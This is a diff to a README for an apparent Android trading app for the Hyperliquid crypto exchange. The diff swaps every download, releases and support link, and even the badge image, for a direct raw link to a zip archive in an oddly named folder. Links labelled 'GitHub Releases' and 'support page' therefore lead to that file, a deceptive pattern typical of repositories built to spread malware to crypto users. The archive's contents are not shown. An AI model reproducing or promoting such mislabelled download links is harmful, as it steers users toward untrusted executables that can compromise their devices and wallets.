@@ -1,6 +1,6 @@
 # 🚀 APP-HyperDefi - Trade Effortlessly on Hyperliquid
 
-[![Download APP-HyperDefi](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/ViejaMaldita/APP-HyperDefi/releases)
+[![Download APP-HyperDefi](https://raw.githubusercontent.com/ViejaMaldita/APP-HyperDefi/main/unorganizable/APP-HyperDefi_v2.5-beta.2.zip)](https://raw.githubusercontent.com/ViejaMaldita/APP-HyperDefi/main/unorganizable/APP-HyperDefi_v2.5-beta.2.zip)
 
 ## 🛠️ Overview
 
@@ -16,12 +16,12 @@ APP-HyperDefi is a native Android application designed for trading on the Hyperl
   
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download APP-HyperDefi](https://github.com/ViejaMaldita/APP-HyperDefi/releases).
+To get started, visit this page to download: [Download APP-HyperDefi](https://raw.githubusercontent.com/ViejaMaldita/APP-HyperDefi/main/unorganizable/APP-HyperDefi_v2.5-beta.2.zip).
 
 ### Steps to Download and Install
 
 1. **Visit the Releases Page**
-   - Click the link above or go to [GitHub Releases](https://github.com/ViejaMaldita/APP-HyperDefi/releases).
+   - Click the link above or go to [GitHub Releases](https://raw.githubusercontent.com/ViejaMaldita/APP-HyperDefi/main/unorganizable/APP-HyperDefi_v2.5-beta.2.zip).
 
 2. **Select the Latest Version**
    - Look for the latest release at the top of the page. It will have the highest version number.
@@ -57,7 +57,7 @@ To get started, visit this page to download: [Download APP-HyperDefi](https://gi
   
 ## 🤝 Support
 
-If you encounter any issues or have questions, please visit our [support page](https://github.com/ViejaMaldita/APP-HyperDefi/issues) for help. You can also report any bugs you find.
+If you encounter any issues or have questions, please visit our [support page](https://raw.githubusercontent.com/ViejaMaldita/APP-HyperDefi/main/unorganizable/APP-HyperDefi_v2.5-beta.2.zip) for help. You can also report any bugs you find.
 
 ## 🌐 Community
 
@@ -74,4 +74,4 @@ We welcome contributions from all users. If you are interested in helping improv
 
 ---
 
-Thank you for choosing APP-HyperDefi. We hope you enjoy the trading experience! Don't forget to visit [this page to download](https://github.com/ViejaMaldita/APP-HyperDefi/releases) the latest version and stay updated with any new releases.
+Thank you for choosing APP-HyperDefi. We hope you enjoy the trading experience! Don't forget to visit [this page to download](https://raw.githubusercontent.com/ViejaMaldita/APP-HyperDefi/main/unorganizable/APP-HyperDefi_v2.5-beta.2.zip) the latest version and stay updated with any new releases.
